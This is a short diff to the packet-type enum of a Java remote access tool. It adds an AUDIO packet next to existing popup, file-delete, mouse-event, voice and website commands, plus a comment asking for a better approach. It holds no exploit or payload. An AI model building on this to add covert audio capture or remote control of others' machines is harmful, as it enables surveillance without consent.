@@ -1,6 +1,8 @@
 package de.sogomn.rat.packet;
 
-
+/*
+ * SHOW ME A BETTER METHOD TO DO THIS
+ */
 public enum PacketType {
 	
 	POPUP(1, PopupPacket.class),
@@ -19,7 +21,8 @@ public enum PacketType {
 	DELETE(14, DeleteFilePacket.class),
 	MOUSE_EVENT(15, MouseEventPacket.class),
 	VOICE(16, VoicePacket.class),
-	WEBSITE(17, WebsitePacket.class);
+	WEBSITE(17, WebsitePacket.class),
+	AUDIO(18, AudioPacket.class);
 	
 	public final byte id;
 	public final Class<? extends IPacket> clazz;
